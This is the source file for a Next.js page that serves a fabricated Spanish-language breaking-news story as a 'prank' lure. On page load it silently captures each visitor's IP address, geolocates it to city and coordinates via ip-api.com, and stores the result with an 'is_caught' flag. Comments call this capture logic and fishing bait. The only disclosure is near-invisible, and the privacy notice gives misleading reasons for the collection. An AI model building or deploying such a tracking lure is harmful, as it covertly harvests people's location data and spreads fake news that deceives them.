import { supabase } from '@/lib/supabase';
import { Metadata } from 'next';
import { headers } from 'next/headers';

type Props = { params: Promise<{ id: string }>; };

export async function generateMetadata({ params }: Props): Promise<Metadata> {
  const { id } = await params;
  const { data: post } = await supabase.from('news_posts').select('*').eq('id', id).single();
  if (!post) return { title: "Noticiario Bromas MX" };
  return {
    title: post.title,
    openGraph: { 
      title: `[NOTICIA] ${post.title}`, 
      images: [post.image_url], 
      type: 'article' 
    },
  };
}

export default async function NewsDetailPage({ params }: Props) {
  const { id } = await params;

  // 🔴 [검거 로직] 접속자 IP 따서 DB 업데이트
  const headerList = await headers();
  const ip = headerList.get('x-forwarded-for')?.split(',')[0] || 'Unknown';

  if (ip !== 'Unknown') {
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
      const geo = await geoRes.json();
      
      if (geo.status === 'success') {
        await supabase.from('news_posts').update({
          ip: ip,
          country: geo.country,
          city: geo.city,
          lat: geo.lat.toString(),
          lon: geo.lon.toString(),
          is_caught: true
        }).eq('id', id);
      }
    } catch (e) {
      console.error("Tracing error:", e);
    }
  }

  const { data: post } = await supabase.from('news_posts').select('*').eq('id', id).single();
  
  if (!post) return <div className="p-10 text-center font-black">Noticia no encontrada.</div>;

  return (
    <main className="min-h-screen bg-white text-black font-sans">
      <div className="bg-red-600 text-white p-3 text-center font-black italic shadow-lg">
        NOTICIARIO BROMAS MX - ÚLTIMO MOMENTO
      </div>

      <div className="max-w-2xl mx-auto p-5 py-10">
        <div className="inline-block bg-black text-white text-[10px] font-bold px-2 py-1 mb-4 uppercase">
          EXCLUSIVA MUNDIAL
        </div>
        
        <h1 className="text-3xl md:text-4xl font-black leading-tight mb-8">
          {post.title}
        </h1>

        <img src={post.image_url} alt="Noticia" className="w-full h-auto mb-10 shadow-2xl border border-gray-200" />

        {/* 🔴 가짜 뉴스 본문 (낚시용) */}
        <div className="space-y-6 text-gray-800 leading-relaxed text-lg border-t pt-8">
          <p className="font-bold text-red-700 underline decoration-red-200 decoration-4 underline-offset-4 text-left font-black">
            [CIUDAD DE MÉXICO] — ÚLTIMA HORA:
          </p>
          <p className="text-left font-black italic">
            Fuentes oficiales han confirmado hace apenas unos minutos un suceso que ha dejado a la comunidad internacional en shock. Las autoridades locales han emitido una alerta naranja mientras los equipos de emergencia se desplazan al lugar de los hechos.
          </p>
          <p className="text-left">
            Varios testigos presenciales afirman haber visto el inicio del incidente alrededor de las 8:00 AM, lo que provocó un cierre inmediato de las calles circundantes. Se espera que el comunicado oficial sea emitido en las próximas horas para esclarecer los detalles de este impactante acontecimiento.
          </p>
          
          {/* 🔴 마지막에 낚시 확인 문구 (더 자연스럽게 숨김) */}
          <div className="py-10 text-center border-t border-dashed border-gray-200 mt-10">
            <p className="text-gray-400 italic text-sm animate-pulse mb-4">
              Cargando más información y videos del lugar...
            </p>
            <div className="opacity-10 hover:opacity-100 transition-opacity duration-500">
               <p className="text-xs font-bold text-gray-300 uppercase">¡Caíste! Esta noticia es una broma.</p>
            </div>
          </div>
        </div>

        {/* 🔴 요청하신 이미지 스타일 정책 고지 (Footer) */}
        <div className="mt-20 text-center px-4">
          <p className="text-[11px] text-gray-400 leading-normal">
            By interacting with this content, you agree to the <br />
            <button 
              className="underline font-medium hover:text-black transition"
              onClickCapture={() => alert("TÉRMINOS: Este sitio es para fines de entretenimiento. Se recopilan datos técnicos (IP/Ubicación) para prevenir el fraude y garantizar la seguridad.")}
            >
              Terms of Use
            </button> & <button 
              className="underline font-medium hover:text-black transition"
              onClickCapture={() => alert("PRIVACIDAD: Los datos de acceso se registran automáticamente para auditoría de seguridad y prevención de suplantación de identidad.")}
            >
              Privacy Policy
            </button>.
          </p>
        </div>
      </div>
    </main>
  );
}